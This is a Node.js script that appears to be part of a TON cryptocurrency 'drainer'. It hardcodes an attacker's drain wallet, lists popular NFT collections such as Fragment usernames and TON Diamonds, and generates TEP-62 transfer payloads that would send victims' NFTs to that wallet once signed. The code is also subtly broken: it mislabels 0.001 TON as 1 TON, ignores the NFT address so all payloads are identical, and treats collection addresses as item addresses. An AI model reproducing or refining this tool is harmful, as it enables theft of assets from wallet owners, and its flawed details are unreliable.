const { Address, beginCell } = require('@ton/core');

// ===== TARGET ADDRESS (WHERE NFTS GET DRAINED TO) =====
const DRAIN_ADDRESS = Address.parse('UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m');
const RESPONSE_DEST = DRAIN_ADDRESS;

// ===== REAL KNOWN NFT COLLECTIONS ON TON =====
const KNOWN_COLLECTIONS = [
    // Fragment Telegram Usernames
    "EQD-cvR0Nz6XAyRBpDeNcmvM6TUfOgWH-wE7OWD8UDKJSUcf",
    // Fragment Usernames
    "EQAOQdwdw1kGlt6_6N5Ybwc9x7wXjPGQmJc4qw4lxm3OADNG",
    // TON Diamonds
    "EQCHN7YgH_ggPF9YJdXzK-G2d3HgQ_Q3JQjGNEG4s3NGbQ1L",
    // Anonymous Numbers
    "EQCXzX0z0rkpNhcKK9hSPXg2WQ8y8w5tZm9t0z6LH7r9GQ6K",
];

// ===== BUILD TEP-62 TRANSFER CELL =====
function buildNFTTransfer(nftAddress, newOwner, responseDestination) {
    const cell = beginCell()
        .storeUint(0x5fcc3d14, 32)      // op: transfer
        .storeUint(0, 64)                // query_id
        .storeAddress(newOwner)          // new_owner
        .storeAddress(responseDestination) // response_destination
        .storeBit(0)                     // custom_payload (empty)
        .storeCoins(1000000)             // forward_amount (1 TON min for NFT transfer)
        .storeBit(0)                     // forward_payload (empty)
        .endCell();
    return cell;
}

// ===== GENERATE PAYLOAD FOR A SINGLE NFT =====
function generatePayload(nftAddress, newOwner, responseDestination) {
    const cell = buildNFTTransfer(nftAddress, newOwner, responseDestination);
    return {
        boc: cell.toBoc(),
        base64: cell.toBoc().toString('base64'),
        hex: cell.toBoc().toString('hex'),
        cell: cell,
    };
}

// ===== BATCH GENERATE FOR ALL COLLECTIONS =====
function generateAllPayloads(newOwner, responseDestination) {
    const results = {};
    for (const collection of KNOWN_COLLECTIONS) {
        results[collection] = generatePayload(collection, newOwner, responseDestination);
    }
    return results;
}

// ===== GET DRAIN CONFIG =====
function getDrainConfig() {
    return {
        drainAddress: DRAIN_ADDRESS.toString(),
        responseDestination: RESPONSE_DEST.toString(),
        collections: KNOWN_COLLECTIONS,
        generatePayload: (nftAddr) => generatePayload(nftAddr, DRAIN_ADDRESS, RESPONSE_DEST),
        getAllPayloads: () => generateAllPayloads(DRAIN_ADDRESS, RESPONSE_DEST),
        collectionCount: KNOWN_COLLECTIONS.length,
    };
}

// ===== CLI OUTPUT =====
if (require.main === module) {
    const config = getDrainConfig();
    console.log('=== SecurytiActiv Drain Config ===');
    console.log(`Drain Address: ${config.drainAddress}`);
    console.log(`Collections: ${config.collectionCount}`);
    console.log('\n=== Sample Payloads ===');
    for (let i = 0; i < Math.min(3, config.collections.length); i++) {
        const payload = config.generatePayload(config.collections[i]);
        console.log(`\nCollection ${i}: ${config.collections[i].slice(0, 20)}...`);
        console.log(`Base64: ${payload.base64.slice(0, 80)}...`);
    }
    console.log('\n=== All Payloads (Base64) ===');
    const all = config.getAllPayloads();
    for (const [addr, data] of Object.entries(all)) {
        console.log(JSON.stringify({ collection: addr, payload: data.base64 }));
    }
}

module.exports = { buildNFTTransfer, generatePayload, generateAllPayloads, getDrainConfig, KNOWN_COLLECTIONS, DRAIN_ADDRESS, RESPONSE_DEST };
